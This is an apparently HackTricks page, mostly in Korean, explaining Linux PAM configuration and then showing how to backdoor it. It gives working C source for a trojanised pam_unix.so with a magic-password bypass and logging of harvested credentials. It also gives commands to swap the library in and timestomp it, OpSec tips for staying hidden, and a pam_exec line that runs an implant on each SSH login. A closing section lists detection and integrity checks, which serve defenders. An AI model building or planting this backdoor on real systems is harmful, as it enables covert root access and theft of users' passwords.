# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### 기본 정보

**PAM (Pluggable Authentication Modules)**은 컴퓨터 서비스에 접근하려는 사용자의 신원을 확인하고, 다양한 기준에 따라 접근을 제어하는 보안 메커니즘이다. 이는 디지털 문지기와 같아 권한 있는 사용자만 특정 서비스에 접근하도록 보장하며, 시스템 과부하를 방지하기 위해 사용을 제한할 수도 있다.

#### 구성 파일

- **Solaris and UNIX-based systems**는 일반적으로 중앙 구성 파일인 `/etc/pam.conf`를 사용한다.
- **Linux systems**는 디렉터리 방식(`/etc/pam.d`)을 선호하며, 서비스별 구성 파일을 해당 디렉터리에 저장한다. 예를 들어 login 서비스의 구성 파일은 `/etc/pam.d/login`에 있다.

An example of a PAM configuration for the login service might look like this:
```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```
#### **PAM 관리 영역**

이러한 영역(관리 그룹)은 **auth**, **account**, **password**, **session**을 포함하며, 각각 인증 및 세션 관리 과정의 다른 측면을 담당합니다:

- **Auth**: 사용자 신원을 검증하며, 종종 비밀번호 입력을 요구합니다.
- **Account**: 계정 검증을 처리하며, 그룹 멤버십이나 시간 제한 같은 조건을 확인합니다.
- **Password**: 패스워드 업데이트를 관리하며, 복잡성 검사나 사전 공격 방지 등을 포함합니다.
- **Session**: 서비스 세션 시작 또는 종료 시 수행되는 작업들을 관리합니다(예: 디렉터리 마운트, 리소스 제한 설정).

#### **PAM 모듈 제어**

컨트롤은 모듈의 성공/실패에 대한 반응을 결정하여 전체 인증 프로세스에 영향을 줍니다. 종류는 다음과 같습니다:

- **Required**: 필수 모듈이 실패하면 최종적으로 실패하지만, 이후의 모든 모듈을 검사한 뒤에 적용됩니다.
- **Requisite**: 실패 시 즉시 프로세스를 종료합니다.
- **Sufficient**: 성공하면 같은 영역의 나머지 검사를 건너뛰지만, 이후 모듈이 실패하면 영향받을 수 있습니다.
- **Optional**: 스택에서 유일한 모듈인 경우에만 실패를 유발합니다.

#### 예시 시나리오

여러 auth 모듈이 있는 설정에서 프로세스는 엄격한 순서를 따릅니다. `pam_securetty` 모듈이 로그인 터미널을 허가되지 않은 것으로 판단하면 root 로그인이 차단되지만, 해당 모듈이 "required" 상태이기 때문에 모든 모듈은 여전히 처리됩니다. `pam_env`는 환경 변수를 설정하여 사용자 경험을 향상시킬 수 있습니다. `pam_ldap`과 `pam_unix` 모듈은 함께 사용자 인증을 수행하며, `pam_unix`는 이전에 제공된 비밀번호를 사용하려 시도하여 인증 방식의 효율성과 유연성을 높입니다.


## PAM 백도어 – `pam_unix.so` 후킹

중요한 Linux 환경에서의 고전적인 지속성 기법은 **swap the legitimate PAM library with a trojanised drop-in**. 모든 SSH / 콘솔 로그인이 `pam_unix.so:pam_sm_authenticate()`를 호출하기 때문에, 몇 줄의 C 코드로 자격 증명을 캡처하거나 *magic* 비밀번호 우회 기능을 구현하기에 충분합니다.

### 컴파일 치트시트
<details>
<summary>예시 `pam_unix.so` trojan</summary>
```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

static int (*orig)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
const char *user, *pass;
pam_get_user(pamh, &user, NULL);
pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

/* Magic pwd → immediate success */
if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

/* Credential harvesting */
int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
dprintf(fd, "%s:%s\n", user, pass);
close(fd);

/* Fall back to original function */
if(!orig) {
orig = dlsym(RTLD_NEXT, "pam_sm_authenticate");
}
return orig(pamh, flags, argc, argv);
}
```
</details>

컴파일하고 은밀히 교체:
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```
### OpSec Tips
1. **Atomic overwrite** – 임시 파일에 기록한 후 `mv`로 제자리에 옮겨 SSH를 차단할 수 있는 절반만 기록된 라이브러리가 생기는 것을 방지하십시오.
2. 로그 파일을 `/usr/bin/.dbus.log` 같은 위치에 두면 정상적인 데스크톱 아티팩트와 섞여 눈에 띄지 않습니다.
3. 심볼 내보내기(`pam_sm_setcred` 등)를 동일하게 유지하여 PAM 오작동을 방지하십시오.

### 탐지
* `pam_unix.so`의 MD5/SHA256을 배포판 패키지와 비교하십시오.
* `rpm -V pam` 또는 `debsums -s libpam-modules`를 사용하면 수동 해싱 없이 교체된 라이브러리를 찾을 수 있습니다.
* `/lib/security/` 아래의 모든 사용자 쓰기 가능(world-writable) 또는 비정상적인 소유권을 확인하십시오.
* `auditd` 규칙: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* 예기치 않은 모듈을 PAM 설정에서 찾기: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

### 빠른 초기 점검 명령 (post-compromise or threat hunting)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```
### `pam_exec`를 persistence 위해 악용
`pam_unix.so`를 교체하는 대신, 보다 가벼운 방법은 `/etc/pam.d/sshd`에 `pam_exec` 라인을 추가하여 정상 스택은 그대로 유지하면서 각 SSH 로그인 시 implant가 실행되게 하는 것입니다:
```bash
# Prepend to /etc/pam.d/sshd
session optional pam_exec.so quiet /usr/local/bin/.ssh_hook.sh
```
`pam_exec`는 sshd PAM 컨텍스트 내에서 root로 실행되기 때문에, 스크립트는 파일시스템의 core libraries를 변경하지 않고도 reverse shells를 생성하거나 env vars를 수집하거나 심어진 sockets을 다시 열 수 있습니다.


## References

- [https://hotpotato.tistory.com/434](https://hotpotato.tistory.com/434)
- [Palo Alto Unit42 – Infiltration of Global Telecom Networks](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)

{{#include ../../banners/hacktricks-training.md}}
